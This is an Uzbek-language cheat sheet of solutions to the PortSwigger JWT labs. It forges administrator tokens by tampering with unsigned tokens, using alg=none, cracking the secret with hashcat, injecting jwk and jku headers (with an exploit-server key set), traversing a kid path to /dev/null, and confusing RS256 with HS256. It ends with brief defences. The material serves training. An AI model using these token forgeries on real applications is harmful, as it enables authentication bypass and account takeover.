# JWT — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**. Tool: **JWT Editor** (BApp).
> Nishon: `sub` ni `administrator` qilib `/admin` ga kirish → `/admin/delete?username=carlos`.

### Unverified signature — APPRENTICE
Imzo umuman tekshirilmaydi → `sub` ni o'zgartirasan.
```
payload: "sub":"wiener"  →  "sub":"administrator"
```

### Flawed signature verification (alg=none) — APPRENTICE
`alg` ni `none` qilib imzoni olib tashlaysan (oxirgi nuqta qoladi).
```
header: "alg":"none"   →   <header>.<payload>.   (signature bo'sh)
```

### Weak signing key (brute-force) — PRACTITIONER
Secret zaif → hashcat bilan sindirib qayta imzolaysan.
```bash
hashcat -a 0 -m 16500 <JWT> jwt.secrets.list
```
> Secret = `secret1`. Base64 qil → JWT Editor Symmetric Key `k` → `sub=administrator` bilan sign.

### JWK header injection — PRACTITIONER
Server header'dagi `jwk` ga ishonadi → o'z RSA kalitingni embed qilasan.
```
JWT Editor: New RSA Key → Attack → "Embedded JWK" → sub=administrator → send
```

### JKU header injection — PRACTITIONER
Server `jku` URL'ga ishonadi, domenni tekshirmaydi → exploit serverda JWK Set joylaysan.
```
Exploit server body: { "keys": [ <your public JWK> ] }
JWT header: "kid":"<your-kid>", "jku":"https://exploit.example.net/jwks.json"
→ sub=administrator → RSA key bilan sign
```

### kid header path traversal — PRACTITIONER
`kid` fayl yo'li → `/dev/null` (bo'sh) ga traversal → null byte secret bilan imzolaysan.
```
JWT Editor: Symmetric Key, k = "" (bo'sh)
header: "kid":"../../../../../../../dev/null"
→ sub=administrator → o'sha bo'sh key bilan sign
```

### Algorithm confusion (RS256 → HS256) — PRACTITIONER
Server RSA public key'ni HMAC secret deb ishlatadi. `/jwks.json` dan public key.
```
1. /jwks.json → JWK → JWT Editor New RSA Key
2. Right-click → Copy Public Key as PEM → Base64-encode
3. New Symmetric Key, k = <base64 PEM>
4. header alg=HS256, sub=administrator → Sign (Don't modify header)
```

### Algorithm confusion, no exposed key — EXPERT
Public key ochiq emas → 2 ta JWT'dan derive qilasan.
```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```
> Chiqgan tampered JWT'larni `/my-account` da sina (200 = to'g'ri key). To'g'ri X.509 key'ni
> Symmetric Key `k` qilib, `alg=HS256`, `sub=administrator` bilan sign.

---

### Eslatma
Tekshir: imzo tekshiriladimi, `alg=none`, zaif secret, `jwk/jku/kid` header injection, algorithm
confusion. Himoya: alg allowlist (faqat kutilgan), kuchli secret, `kid`/`jku` validatsiya.
Umumiy: bu papka README.
